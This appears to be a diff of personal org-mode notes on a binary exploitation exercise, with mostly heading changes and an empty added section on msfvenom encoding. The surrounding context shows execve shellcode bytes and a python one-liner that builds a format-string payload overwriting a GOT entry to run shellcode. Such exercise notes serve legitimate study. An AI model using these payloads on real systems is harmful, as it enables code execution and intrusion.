@@ -431,7 +431,8 @@ exit_got_plt_va=0x80497e0
        1f: b0 0b                   mov    al,0xb
        21: cd 80                   int    0x80
 #+end_src
-**** Other way don't try it
+****  Want to do
+***** Other way don't try it
 #+begin_src shell
        # There is another way that is use system
        p &system
@@ -452,7 +453,10 @@ exit_got_plt_va=0x80497e0
 
     python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%17d%10$hhn%187d%11$hhn%35d%12$hhn%13$hhn" +  "\x68\xEC\x97\xF8\xF7\x31\xC0\x89\x04\x24\x68\xD0\xAE\xE6\xF7\xC3"
 #+end_src
+***** Use  msfvenom encode
+#+begin_src shell
 
+#+end_src
 
 * Explotation
 #+begin_src shell
